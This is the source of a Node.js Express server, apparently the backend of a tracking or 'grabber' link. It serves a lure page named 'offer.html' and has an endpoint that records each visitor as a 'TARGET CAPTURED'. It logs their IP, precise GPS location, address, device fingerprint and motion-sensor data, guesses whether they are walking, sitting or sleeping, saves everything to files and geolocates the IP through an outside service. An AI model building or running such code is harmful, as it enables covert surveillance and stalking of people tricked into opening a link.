const express = require('express');
const https = require('https');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('.'));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/offer.html');
});

function detectActivity(motion, orientation) {
    if (!motion) return 'No Motion Data';
    
    const x = motion.x || 0;
    const y = motion.y || 0;
    const z = motion.z || 0;
    const totalAccel = Math.sqrt(x*x + y*y + z*z);
    const tilt = orientation ? Math.abs(orientation.beta || 0) : 0;
    
    console.log(`Motion Debug: x=${x}, y=${y}, z=${z}, total=${totalAccel}, tilt=${tilt}`);
    
    if (totalAccel > 15) return 'Running (85%)';
    if (totalAccel > 8) return 'Walking (80%)';
    if (totalAccel > 3) return 'Standing/Moving (70%)';
    if (tilt > 60) return 'Sleeping/Lying (75%)';
    if (totalAccel < 1.5) return 'Sitting/Still (85%)';
    return 'Standing (65%)';
}

app.post('/capture-ip', (req, res) => {
    const clientIP = req.body.ip;
    const lat = req.body.lat;
    const lng = req.body.lng;
    
    const timestamp = new Date().toISOString();
    const activity = detectActivity(req.body.motion, req.body.orientation);
    const motionInfo = req.body.motion ? `
Motion Data:
  Acceleration: x=${req.body.motion.x}, y=${req.body.motion.y}, z=${req.body.motion.z}
  Gravity: x=${req.body.motion.gravity?.x}, y=${req.body.motion.gravity?.y}, z=${req.body.motion.gravity?.z}` : '';
    const rotationInfo = req.body.rotation ? `
Rotation Rate:
  Alpha: ${req.body.rotation.alpha}
  Beta: ${req.body.rotation.beta}
  Gamma: ${req.body.rotation.gamma}` : '';
    const orientationInfo = req.body.orientation ? `
Orientation:
  Compass: ${req.body.orientation.alpha}°
  Tilt F/B: ${req.body.orientation.beta}°
  Tilt L/R: ${req.body.orientation.gamma}°` : '';
    
    const logData = `
=== TARGET CAPTURED - ${timestamp} ===
IP: ${clientIP}
Device: ${req.body.userAgent || 'Unknown'}
Screen: ${req.body.screen || 'Unknown'}
Timezone: ${req.body.timezone || 'Unknown'}
Language: ${req.body.language || 'Unknown'}
Battery: ${req.body.battery || 'Unknown'}
Platform: ${req.body.platform || 'Unknown'}
Cookies: ${req.body.cookieEnabled || 'Unknown'}
Online: ${req.body.onlineStatus || 'Unknown'}
Color Depth: ${req.body.colorDepth || 'Unknown'}
Pixel Ratio: ${req.body.pixelRatio || 'Unknown'}
Touch Support: ${req.body.touchSupport || 'Unknown'}
Referrer: ${req.body.referrer || 'Direct'}
URL: ${req.body.url || 'Unknown'}
Address: ${req.body.address || 'Not available'}
ACTIVITY: ${activity}${motionInfo}${rotationInfo}${orientationInfo}
`;
    
    console.log(logData);
    console.log('Motion received:', !!req.body.motion);
    console.log('Orientation received:', !!req.body.orientation);
    
    // Save to file
    const filename = `captured_data_${new Date().toISOString().split('T')[0]}.txt`;
    fs.appendFileSync(filename, logData);
    if (lat && lng) {
        console.log('GPS:', lat + ',' + lng);
        console.log('Maps:', `https://maps.google.com/?q=${lat},${lng}`);
    }
    
    if (clientIP) {
        https.get(`https://ipinfo.io/${clientIP}/json`, (response) => {
            let data = '';
            response.on('data', chunk => data += chunk);
            response.on('end', () => {
                try {
                    const location = JSON.parse(data);
                    console.log('IP Location (ISP):', location.city + ', ' + location.region + ', ' + location.country);
                    console.log('ISP:', location.org);
                    if (lat && lng) {
                        const gpsData = `ACTUAL GPS LOCATION: ${lat},${lng}
Google Maps: https://maps.google.com/?q=${lat},${lng}
Note: IP location may be inaccurate - GPS is precise${motionInfo}${rotationInfo}${orientationInfo}
`;
                        console.log(gpsData);
                        if (req.body.motion || req.body.rotation || req.body.orientation) {
                            console.log('Device Motion/Orientation Data Captured');
                            console.log('Detected Activity:', activity);
                        }
                        fs.appendFileSync(filename, gpsData);
                    }
                } catch (e) {
                    console.log('Location API failed');
                }
                console.log('==================\n');
            });
        }).on('error', (e) => {
            console.log('Location API Error');
            console.log('==================\n');
        });
    } else {
        console.log('No IP received');
        console.log('==================\n');
    }
    
    res.json({success: true});
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});